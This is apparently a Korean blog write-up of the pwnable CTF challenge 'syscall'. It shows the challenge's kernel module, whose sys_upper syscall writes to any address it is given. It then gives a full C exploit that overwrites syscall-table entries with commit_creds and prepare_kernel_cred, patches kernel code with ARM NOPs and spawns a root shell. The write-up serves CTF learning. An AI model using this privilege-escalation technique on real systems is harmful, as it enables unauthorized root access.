---
title: "[pwnable] syscall"
date: 2025-02-24 07:10:00 +0900
categories: [pwnable]
tags: [pwnable]
description: pwnable, system hack
---

## syscall
#### 문제 환경
![alt text](assets/img/syscall/image-1.png)
처음 ssh를 접속 하면 부트 로그가 나오며, exit을 할 시 환경이 qemu임을 알 수 있었습니다.

### 시스템콜 (sys_upper)
``` c
// adding a new system call : sys_upper

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/vmalloc.h>
#include <linux/mm.h>
#include <asm/unistd.h>
#include <asm/page.h>
#include <linux/syscalls.h>

#define SYS_CALL_TABLE		0x8000e348		// manually configure this address!!
#define NR_SYS_UNUSED		223

//Pointers to re-mapped writable pages
unsigned int** sct;

asmlinkage long sys_upper(char *in, char* out){
	int len = strlen(in);
	int i;
	for(i=0; i<len; i++){
		if(in[i]>=0x61 && in[i]<=0x7a){
			out[i] = in[i] - 0x20;
		}
		else{
			out[i] = in[i];
		}
	}
	return 0;
}

static int __init initmodule(void ){
	sct = (unsigned int**)SYS_CALL_TABLE;
	sct[NR_SYS_UNUSED] = sys_upper;
	printk("sys_upper(number : 223) is added\n");
	return 0;
}

static void __exit exitmodule(void ){
	return;
}

module_init( initmodule );
module_exit( exitmodule );

```
input으로 전달받은 문자열에 대해 각 캐릭터가 알파벳 소문자(a-z)의 경우 대문자로 변경하는 시스템콜입니다.

#### tmp 디렉토리
![alt text](assets/img/syscall/image-3.png)
tmp 디렉토리에서 파일 쓰기 및 gcc 컴파일 가능한 것 확인

> 시스템콜을 활용한 c 프로그래밍으로 문제를 해결해야 할 것으로 예상

#### 커널 버전 확인
![alt text](assets/img/syscall/image-2.png)
커널 버전이 3.11이어서 루트킷을 만들 때 사용하려 했던 kallsyms를 사용가능할 것으로 예상하였습니다.
![alt text](assets/img/syscall/image-4.png)
kallsyms 헤더파일이 존재하지 않았습니다.

#### /proc/kallsyms 확인
![alt text](assets/img/syscall/image-6.png)

### 커널 권한 상승 함수
`commit_creds(prepare_kernel_cred(NULL));` 을 호출하면 현재 프로세스의 권한이 루트로 변경됩니다.

* commit_creds : `0x8003f56c`
* prepare_kernel_cred : `0x8003f924`

### exploit 작성
`commit_creds` 함수 마지막의 `0x6c` 는 sys_upper함수에서 알파벳 소문자로 판단되어 `0x20`을 빼게 됩니다. 이를 우회하기 위해 0x8003f560을 chmod 시스템콜의 위치에 덮어씌우고, 0x8003f560에서 12바이트를 nop으로 덮어씌웁니다.   

![alt text](assets/img/syscall/image-14.png)
arm 아키텍쳐에서 nop 명령어는 `mov r0, r0` 등으로 구현할 수 있습니다.
`mov r1, r1`의 opcode는 `0xe1a01001` 입니다.

```c
#include <unistd.h>
#include <sys/syscall.h>

#define SYS_upper 223

unsigned long** SYS_CALL_TABLE = 0x8000e348;

int main() {
  syscall(SYS_upper, "\xe1\xa0\x10\x01\xe1\xa0\x10\x01\xe1\xa0\x10\x01", 0x8003f560); // nop

  syscall(SYS_upper, "\x60\xf5\x03\x80", &SYS_CALL_TABLE[__NR_chmod]);
  syscall(SYS_upper, "\x24\xf9\x03\x80", &SYS_CALL_TABLE[__NR_chown]);
  
  syscall(__NR_chmod, syscall(__NR_chown, NULL));

  system("/bin/sh");
  
  return 0;
}
```

<!-- ```c
#include <unistd.h>
#include <sys/syscall.h>

#define SYS_upper 223

unsigned long** SYS_CALL_TABLE = 0x8000e348;

int main() {
  syscall(SYS_upper, "\x00\xf0\x20\xe3\x00\xf0\x20\xe3\x00\xf0\x20\xe3", 0x8003f560); // nop

  syscall(SYS_upper, "\x60\xf5\x03\x80", &SYS_CALL_TABLE[__NR_chmod]);
  syscall(SYS_upper, "\x24\xf9\x03\x80", &SYS_CALL_TABLE[__NR_chown]);
  
  syscall(__NR_chmod, syscall(__NR_chown, NULL));

  system("/bin/sh");
  
  return 0;
}
``` -->

![alt text](assets/img/syscall/image-13.png)


